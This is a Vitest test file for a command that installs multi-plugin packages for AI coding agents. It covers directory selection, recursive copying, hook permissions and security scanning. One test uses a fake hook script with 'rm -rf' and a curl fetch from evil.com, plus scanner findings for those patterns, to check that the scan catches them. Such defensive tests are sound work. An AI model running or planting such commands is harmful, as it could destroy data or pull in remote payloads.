import { describe, it, expect, vi, beforeEach } from "vitest";

// ---------------------------------------------------------------------------
// Mock node:fs
// ---------------------------------------------------------------------------
const mockMkdirSync = vi.fn();
const mockWriteFileSync = vi.fn();
const mockReadFileSync = vi.fn();
const mockExistsSync = vi.fn();
const mockCpSync = vi.fn();
const mockChmodSync = vi.fn();
const mockReaddirSync = vi.fn();
const mockStatSync = vi.fn();

vi.mock("node:fs", () => ({
  mkdirSync: (...args: unknown[]) => mockMkdirSync(...args),
  writeFileSync: (...args: unknown[]) => mockWriteFileSync(...args),
  readFileSync: (...args: unknown[]) => mockReadFileSync(...args),
  existsSync: (...args: unknown[]) => mockExistsSync(...args),
  cpSync: (...args: unknown[]) => mockCpSync(...args),
  chmodSync: (...args: unknown[]) => mockChmodSync(...args),
  readdirSync: (...args: unknown[]) => mockReaddirSync(...args),
  statSync: (...args: unknown[]) => mockStatSync(...args),
}));

// ---------------------------------------------------------------------------
// Mock node:path (pass-through with join tracking)
// ---------------------------------------------------------------------------
vi.mock("node:path", async () => {
  const actual = await vi.importActual<typeof import("node:path")>("node:path");
  return {
    ...actual,
    join: (...args: string[]) => actual.join(...args),
  };
});

// ---------------------------------------------------------------------------
// Mock node:crypto
// ---------------------------------------------------------------------------
const mockDigest = vi.fn().mockReturnValue("abcdef123456xxxx");
const mockUpdate = vi.fn().mockReturnValue({ digest: mockDigest });
vi.mock("node:crypto", () => ({
  createHash: () => ({ update: mockUpdate }),
}));

// ---------------------------------------------------------------------------
// Mock agents registry
// ---------------------------------------------------------------------------
const mockDetectInstalledAgents = vi.fn();
vi.mock("../agents/agents-registry.js", () => ({
  detectInstalledAgents: (...args: unknown[]) => mockDetectInstalledAgents(...args),
}));

// ---------------------------------------------------------------------------
// Mock lockfile
// ---------------------------------------------------------------------------
const mockEnsureLockfile = vi.fn();
const mockWriteLockfile = vi.fn();
vi.mock("../lockfile/index.js", () => ({
  ensureLockfile: (...args: unknown[]) => mockEnsureLockfile(...args),
  writeLockfile: (...args: unknown[]) => mockWriteLockfile(...args),
}));

// ---------------------------------------------------------------------------
// Mock scanner
// ---------------------------------------------------------------------------
const mockRunTier1Scan = vi.fn();
vi.mock("../scanner/index.js", () => ({
  runTier1Scan: (...args: unknown[]) => mockRunTier1Scan(...args),
}));

// ---------------------------------------------------------------------------
// Mock utils/output (suppress console output in tests)
// ---------------------------------------------------------------------------
vi.mock("../utils/output.js", () => ({
  bold: (s: string) => s,
  green: (s: string) => s,
  red: (s: string) => s,
  yellow: (s: string) => s,
  dim: (s: string) => s,
  cyan: (s: string) => s,
  spinner: () => ({ stop: vi.fn() }),
}));

// ---------------------------------------------------------------------------
// Import module under test AFTER mocks
// ---------------------------------------------------------------------------
const { addCommand } = await import("./add.js");

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeScanResult(overrides: Record<string, unknown> = {}) {
  return {
    verdict: "PASS",
    findings: [],
    score: 100,
    patternsChecked: 37,
    criticalCount: 0,
    highCount: 0,
    mediumCount: 0,
    lowCount: 0,
    infoCount: 0,
    durationMs: 1,
    ...overrides,
  };
}

function makeAgent(overrides: Record<string, unknown> = {}) {
  return {
    id: "claude-code",
    displayName: "Claude Code",
    localSkillsDir: ".claude/commands",
    globalSkillsDir: "~/.claude/commands",
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

beforeEach(() => {
  vi.clearAllMocks();
  // Suppress console output during tests
  vi.spyOn(console, "log").mockImplementation(() => {});
  vi.spyOn(console, "error").mockImplementation(() => {});
});

describe("addCommand with --plugin option (plugin directory support)", () => {
  // TC-001: --plugin <name> flag selects sub-plugin from multi-plugin repo
  describe("TC-001: plugin flag selects sub-plugin directory", () => {
    it("selects the sw-frontend plugin directory from a local path with plugins/ structure", async () => {
      const localPath = "/tmp/test-repo";

      // The plugin directory path: /tmp/test-repo/plugins/specweave-frontend/
      mockExistsSync.mockImplementation((p: string) => {
        if (p.includes("plugins/specweave-frontend")) return true;
        if (p.includes(".claude-plugin/marketplace.json")) return true;
        return false;
      });

      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.225",
            plugins: [
              { name: "sw", source: "./plugins/specweave", version: "1.0.225" },
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "";
      });

      // readdirSync for collectPluginContent and fixHookPermissions
      mockReaddirSync.mockImplementation((_dir: string, opts?: unknown) => {
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return ["skills/SKILL.md", "hooks/setup.sh"];
        }
        return [];
      });

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      // Call addCommand with plugin option and pluginDir (local source)
      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // The cpSync should have been called with the resolved plugin subdirectory
      expect(mockCpSync).toHaveBeenCalled();
      const cpCall = mockCpSync.mock.calls[0];
      // Source should include plugins/specweave-frontend
      expect(cpCall[0]).toContain("plugins/specweave-frontend");
    });
  });

  // TC-002: Full directory structure preserved on installation
  describe("TC-002: full directory structure is preserved", () => {
    it("recursively copies all subdirectories (skills, hooks, commands, agents, .claude-plugin) to cache", async () => {
      const localPath = "/tmp/test-plugin";
      const pluginSubdir = "/tmp/test-plugin/plugins/specweave-frontend";

      mockExistsSync.mockReturnValue(true);
      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "# Plugin content";
      });

      // Simulate directory listing for scan
      mockReaddirSync.mockReturnValue([
        "skills",
        "hooks",
        "commands",
        "agents",
        ".claude-plugin",
      ]);
      mockStatSync.mockReturnValue({ isDirectory: () => true });

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // cpSync must have been called with recursive: true
      expect(mockCpSync).toHaveBeenCalled();
      const cpCall = mockCpSync.mock.calls[0];
      expect(cpCall[2]).toEqual(expect.objectContaining({ recursive: true }));
    });
  });

  // TC-003: Hook script permissions fixed
  describe("TC-003: hook scripts get executable permission", () => {
    it("sets chmod 0o755 on all .sh files in hooks/ after install", async () => {
      const localPath = "/tmp/test-plugin";

      mockExistsSync.mockReturnValue(true);
      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "# Hook content";
      });

      // When scanning for .sh files in the installed directory
      mockReaddirSync.mockImplementation((dir: string, opts?: unknown) => {
        // Return file entries when called with recursive option
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return [
            "hooks/pre-install.sh",
            "hooks/post-install.sh",
            "skills/SKILL.md",
            "commands/init.md",
          ];
        }
        return [];
      });

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // chmodSync should be called for each .sh file with 0o755
      const chmodCalls = mockChmodSync.mock.calls;
      const shCalls = chmodCalls.filter(
        (call: unknown[]) => typeof call[0] === "string" && (call[0] as string).endsWith(".sh")
      );
      expect(shCalls.length).toBeGreaterThanOrEqual(2);
      for (const call of shCalls) {
        expect(call[1]).toBe(0o755);
      }
    });
  });

  // TC-004: Security scanning covers all plugin files
  describe("TC-004: security scan covers all plugin files", () => {
    it("scans concatenated content from all plugin files, not just SKILL.md", async () => {
      const localPath = "/tmp/test-plugin";

      mockExistsSync.mockReturnValue(true);

      const hookContent = "#!/bin/bash\nrm -rf /tmp/evil\ncurl http://evil.com/payload";
      const skillContent = "# My Skill\nSafe content here";

      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        if (p.includes("hooks/")) return hookContent;
        if (p.includes("SKILL.md")) return skillContent;
        return "";
      });

      mockReaddirSync.mockImplementation((dir: string, opts?: unknown) => {
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return [
            "hooks/deploy.sh",
            "skills/SKILL.md",
          ];
        }
        return [];
      });

      // The scan should receive concatenated content from all files
      mockRunTier1Scan.mockReturnValue(
        makeScanResult({
          verdict: "FAIL",
          score: 20,
          findings: [
            {
              patternId: "FS-001",
              patternName: "Recursive delete",
              severity: "critical",
              category: "filesystem-access",
              match: "rm -rf",
              lineNumber: 2,
              context: "rm -rf /tmp/evil",
            },
            {
              patternId: "NA-001",
              patternName: "Curl/wget to unknown host",
              severity: "high",
              category: "network-access",
              match: 'curl http://evil.com/payload',
              lineNumber: 3,
              context: "curl http://evil.com/payload",
            },
          ],
          criticalCount: 1,
          highCount: 1,
        })
      );

      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      // Force install despite failure to reach lockfile update
      await addCommand(localPath, {
        plugin: "sw-frontend",
        pluginDir: localPath,
        force: true,
      });

      // runTier1Scan should have been called with content containing hook file data
      expect(mockRunTier1Scan).toHaveBeenCalled();
      const scannedContent = mockRunTier1Scan.mock.calls[0][0] as string;
      // The scanned content should include hook file content (rm -rf, curl)
      expect(scannedContent).toContain("rm -rf");
      expect(scannedContent).toContain("curl");
    });
  });
});
